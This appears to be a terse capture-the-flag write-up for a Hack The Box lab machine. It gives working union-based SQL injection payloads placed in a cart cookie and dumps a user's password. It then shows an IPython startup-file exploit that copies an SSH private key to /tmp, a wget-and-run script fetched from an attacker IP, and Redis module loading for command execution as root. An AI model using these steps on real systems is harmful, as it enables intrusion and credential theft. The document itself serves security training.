Recon:
            nmap -A -F 10.10.11.172
                 22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
                 80/tcp  open  http     nginx 1.18.0
                 443/tcp open  ssl/http nginx 1.18

            Domain && subdomain

                          http://shared.htb
                          http://checkout.shared.htb
                                    cookie custom_cart=%7B%2253GG2EF8%22%3A%223%22%7D
                                    decode cookie value custom_cart={"2E6E8GXJ":"1"}

Intial Foothold: 
                       union based sql injection
                      #{"2E6E8GXJ'AND 1=2 UNION SELECT 1,(user()),3-- -":"1"}  // url enocde and burp
                        username = checkout@localhost

                      #{"2E6E8GXJ'AND 1=2 UNION SELECT 1,(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),3-- -":"1"}
                       information_schema,checkout

                      #{"2E6E8GXJ'AND 1=2 UNION SELECT 1,(select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = 'checkout'),3-- -":"1"}
                        user,product

                      #{"2E6E8GXJ'AND 1=2 UNION SELECT 1,(select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COlUMNS where TABLE_SCHEMA = 'checkout'),3-- -":"1"}
                        id,username,password,id,code,price

                      #{"2E6E8GXJ'AND 1=2 UNION SELECT 1,(select group_concat(username) from checkout.user),3-- -":"1"}
                        james_mason

                      #{"2E6E8GXJ'AND 1=2 UNION SELECT 1,(select group_concat(password) from checkout.user),3-- -":"1"}
                        fc895d4eddc2fc12f995e18c865cf273:Soleil101 
 
                    james_mason:Soleil101
                    
Foothold:
              ssh james_mason@10.10.11.172
              find another user named dan_smith > pspy64 > ipython
              exploit on ipython https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x

         created a script #!/bin/bash
                         mkdir -m 777 profile_default
                         mkdir -m 777 profile_default/startup
                         echo "import os; os.system('cat ~/.ssh/id_rsa > /tmp/key')" > profile_default/startup/foo.py
                         execute it in /opt/script_reviews wget http://10.10.14.12/script.sh  && chmod +x script.sh && bash script.sh

Privillage Esclation:
                       ssh via id_rsa
                       linpeas.sh > redis server running as root
                       also find a file in /usr/local/bin/redis_connector_dev

              dowl the file #scp -i id_rsa dan_smith@10.10.11.172:/usr/local/bin/redis_connector_dev redis_file
                              redis_connector_dev  

              run it locally and listen to default port we get the username and password auth:F2WHqJUz2WEz=Gqq
                  https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis 
                  https://github.com/n0b0dyCN/RedisModules-ExecuteCommand

              run make command in cloned dir.
                  cp module.so to machin: scp module.so james_mason@10.10.11.172:/home/james_mason [move it to dan_smith]
                  run redis-cli
                               >auth F2WHqJUz2WEz=Gqq
                               >MODULE LOAD /home/dan_smith/module.so
                               >system.exec "id"
   

Pwned.!!!